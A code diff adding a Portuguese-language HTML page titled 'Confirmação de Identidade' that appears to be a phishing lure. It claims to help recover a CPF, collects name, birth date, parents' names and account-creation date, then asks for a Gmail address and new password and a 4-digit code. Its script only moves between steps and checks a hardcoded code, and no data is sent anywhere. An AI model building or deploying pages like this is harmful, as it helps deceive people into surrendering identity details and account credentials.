@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Confirmação de Identidade</title>
+
+<style>
+body{
+    font-family: Arial, sans-serif;
+    background:#f2f2f2;
+    margin:0;
+    padding:0;
+}
+.container{
+    max-width:440px;
+    margin:40px auto;
+    background:#fff;
+    padding:22px;
+    border-radius:8px;
+    box-shadow:0 0 12px rgba(0,0,0,0.12);
+}
+.logo{
+    text-align:center;
+}
+.logo img{
+    max-width:90px;
+    margin-bottom:10px;
+}
+h2{
+    text-align:center;
+    color:#333;
+}
+.section-title{
+    margin-top:18px;
+    font-weight:bold;
+    color:#004a99;
+    font-size:14px;
+}
+input{
+    width:100%;
+    padding:10px;
+    margin-top:8px;
+    border:1px solid #ccc;
+    border-radius:4px;
+}
+.row{
+    display:flex;
+    gap:10px;
+}
+.row input{
+    flex:1;
+}
+button{
+    width:100%;
+    padding:12px;
+    margin-top:15px;
+    background:#0066cc;
+    color:#fff;
+    border:none;
+    border-radius:4px;
+    font-size:16px;
+}
+.secondary{
+    background:#777;
+}
+button:disabled{
+    background:#999;
+}
+.error{
+    color:red;
+    margin-top:10px;
+}
+.success{
+    color:green;
+    text-align:center;
+    font-size:18px;
+}
+.hidden{
+    display:none;
+}
+.info{
+    font-size:14px;
+    color:#555;
+    margin-bottom:10px;
+    text-align:center;
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+<div class="logo">
+    <img src="https://cdn-icons-png.flaticon.com/512/3064/3064197.png">
+</div>
+
+<h2>Confirmação de Identidade</h2>
+
+<!-- STEP 1 -->
+<div id="step1">
+    <p class="info">Preencha corretamente as informações abaixo para recuperar o seu CPF.</p>
+
+    <div class="section-title">Dados pessoais</div>
+    <input type="text" placeholder="Nome">
+    <input type="text" placeholder="Sobrenome">
+
+    <div class="section-title">Data de nascimento</div>
+    <div class="row">
+        <input type="number" placeholder="Dia">
+        <input type="number" placeholder="Mês">
+        <input type="number" placeholder="Ano">
+    </div>
+
+    <div class="section-title">Afiliação</div>
+    <input type="text" placeholder="Nome do pai">
+    <input type="text" placeholder="Nome da mãe">
+
+    <div class="section-title">Data de criação da conta</div>
+    <div class="row">
+        <input type="number" placeholder="Mês">
+        <input type="number" placeholder="Ano">
+    </div>
+
+    <button onclick="goUpdate()">Continuar</button>
+</div>
+
+<!-- STEP 2 -->
+<div id="stepUpdate" class="hidden">
+    <p class="info">Você quer atualizar teus dados de login?</p>
+
+    <button onclick="showLogin()">SIM</button>
+    <button class="secondary" onclick="goCode()">NÃO</button>
+</div>
+
+<!-- STEP 3 (LOGIN UPDATE) -->
+<div id="stepLogin" class="hidden">
+    <div class="section-title">Atualização de login</div>
+    <input type="email" placeholder="Gmail">
+    <input type="password" placeholder="Nova senha">
+    <input type="password" placeholder="Confirmar senha">
+
+    <button onclick="goCode()">Continuar</button>
+</div>
+
+<!-- STEP 4 (CODE) -->
+<div id="stepCode" class="hidden">
+    <p class="info">Digite o código de segurança de 4 dígitos.</p>
+
+    <input type="password" id="code" placeholder="Código de segurança">
+    <button onclick="verify()">Confirmar</button>
+
+    <div id="error" class="error hidden"></div>
+</div>
+
+<div id="success" class="hidden">
+    <p class="success">Identidade confirmada com sucesso.</p>
+</div>
+
+</div>
+
+<script>
+const CODE = "0987";
+let attempts = 3;
+
+function goUpdate(){
+    hideAll();
+    document.getElementById("stepUpdate").classList.remove("hidden");
+}
+
+function showLogin(){
+    hideAll();
+    document.getElementById("stepLogin").classList.remove("hidden");
+}
+
+function goCode(){
+    hideAll();
+    document.getElementById("stepCode").classList.remove("hidden");
+}
+
+function verify(){
+    const inputCode = document.getElementById("code").value;
+    const error = document.getElementById("error");
+
+    if(inputCode === CODE){
+        hideAll();
+        document.getElementById("success").classList.remove("hidden");
+    } else {
+        attempts--;
+        error.classList.remove("hidden");
+        if(attempts > 0){
+            error.innerText = "Código errado. Tentativas restantes: " + attempts;
+        } else {
+            error.innerText = "Número máximo de tentativas excedido.";
+            document.querySelector("#stepCode button").disabled = true;
+        }
+    }
+}
+
+function hideAll(){
+    document.getElementById("step1").classList.add("hidden");
+    document.getElementById("stepUpdate").classList.add("hidden");
+    document.getElementById("stepLogin").classList.add("hidden");
+    document.getElementById("stepCode").classList.add("hidden");
+}
+</script>
+
+</body>
+</html>
